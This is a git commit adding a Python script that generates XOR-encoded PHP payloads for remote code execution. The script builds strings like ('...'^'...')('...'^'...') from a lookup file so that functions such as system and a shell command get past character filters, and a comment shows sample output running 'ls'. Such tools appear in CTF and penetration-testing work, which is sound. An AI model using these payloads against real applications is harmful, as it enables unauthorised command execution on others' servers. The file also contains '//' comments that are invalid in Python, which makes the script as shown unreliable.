373b4789619ea0efb31f1be4d0f20e09ed3b91c2
npfs <79258733+npfs06@users.noreply.github.com>
2021-08-25 09:10:32 +0800

    Add files via upload

---
+++ 脚本/②异或命令构造.py
@@ -0,0 +1,31 @@
+import requests
+import urllib
+from sys import *
+import os
+def action(arg):
+   s1=""
+   s2=""
+   for i in arg:
+       f=open("xor_rce.txt","r")
+       while True:
+           t=f.readline()
+           if t=="":
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output="(\""+s1+"\"^\""+s2+"\")"
+   return(output)
+   
+while True:
+   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
+   print(param)
+   
+   
+//运行结果如下：  
+//[+] your function：system
+//[+] your command：ls
+//("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08"^"%60%7b");
